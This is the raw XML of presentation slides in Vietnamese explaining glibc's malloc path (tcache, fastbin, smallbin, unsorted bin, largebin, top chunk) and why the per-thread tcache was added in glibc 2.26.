        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="2011680"/>
            <a:ext cx="1452372" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>tcache[idx] còn entry?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="2880360"/>
            <a:ext cx="1452372" cy="1737360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>__libc_malloc — KHÔNG gọi _int_malloc, không khoá arena</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2202180" y="3063240"/>
            <a:ext cx="146304" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2366772" y="1417320"/>
            <a:ext cx="1726692" cy="3291840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4237"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2503932" y="1508760"/>
            <a:ext cx="1452372" cy="50292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2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2503932" y="2011680"/>
            <a:ext cx="1452372" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nb ≤ 0x80, fastbin còn chunk?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2503932" y="2880360"/>
            <a:ext cx="1452372" cy="1737360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pop LIFO, trả về ngay</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4111752" y="3063240"/>
            <a:ext cx="146304" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4276344" y="1417320"/>
            <a:ext cx="1726692" cy="3291840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4237"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4413504" y="1508760"/>
            <a:ext cx="1452372" cy="50292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3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4413504" y="2011680"/>
            <a:ext cx="1452372" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nb &lt; 0x400, smallbin còn chunk?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4413504" y="2880360"/>
            <a:ext cx="1452372" cy="1737360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pop FIFO, trả về ngay</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6021324" y="3063240"/>
            <a:ext cx="146304" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6185916" y="1417320"/>
            <a:ext cx="1726692" cy="3291840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4237"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6323076" y="1508760"/>
            <a:ext cx="1452372" cy="50292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4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6323076" y="2011680"/>
            <a:ext cx="1452372" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Duyệt unsorted bin</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6323076" y="2880360"/>
            <a:ext cx="1452372" cy="1737360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>khớp nb trả ngay; không khớp thì xếp vào small/largebin, duyệt tiếp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7930896" y="3063240"/>
            <a:ext cx="146304" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8095488" y="1417320"/>
            <a:ext cx="1726692" cy="3291840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4237"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8232648" y="1508760"/>
            <a:ext cx="1452372" cy="50292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5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8232648" y="2011680"/>
            <a:ext cx="1452372" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nb ≥ 0x400, largebin có chunk vừa đủ?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8232648" y="2880360"/>
            <a:ext cx="1452372" cy="1737360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cắt theo best-fit, trả về</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9840468" y="3063240"/>
            <a:ext cx="146304" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10005060" y="1417320"/>
            <a:ext cx="1726692" cy="3291840"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4237"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10142220" y="1508760"/>
            <a:ext cx="1452372" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>6</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10142220" y="2011680"/>
            <a:ext cx="1452372" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>use_top: cắt từ TOP CHUNK (3.2)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10142220" y="2880360"/>
            <a:ext cx="1452372" cy="1737360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>hoặc sysmalloc nếu top cũng không đủ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Shape 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4892040"/>
            <a:ext cx="11274552" cy="1325880"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5517"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5056632"/>
            <a:ext cx="10908792" cy="105156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Bước 1 nằm ở __libc_malloc (mục 5.1) — KHÔNG chạm _int_malloc; bước 2–6 mới nằm trong _int_malloc. Đây là lý do mục 5.4 phân biệt "free trùng lọt qua tcache" khác "lọt qua fastbin": hai bin đứng ở hai bước đầu tiên, riêng biệt. (Viền nét đứt = từng bước quyết định của malloc(), không phải vùng nhớ thật.)</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Tcache: cache riêng cho từng thread</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4-a,b · BẢN CHẤT VÀ LÝ DO RA ĐỜI</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5522976" cy="3108960"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2353"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="158191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a) TRƯỚC GLIBC 2.26 (2017)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1874520"/>
            <a:ext cx="5157216"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Một ổ khóa cho mọi thread</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2331720"/>
            <a:ext cx="5157216" cy="208483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Mọi </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>malloc()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free()</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> tranh nhau arena, mỗi arena một mutex</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Đa luồng cấp phát nhiều object nhỏ thì các thread khóa chờ nhau</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chi phí đồng bộ còn lớn hơn chi phí cấp phát (glibc bug 17195)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="1417320"/>
            <a:ext cx="5522976" cy="3108960"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2353"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="158191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b) TỪ GLIBC 2.26</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="1874520"/>
            <a:ext cx="5157216"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Thread cache không cần khóa</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
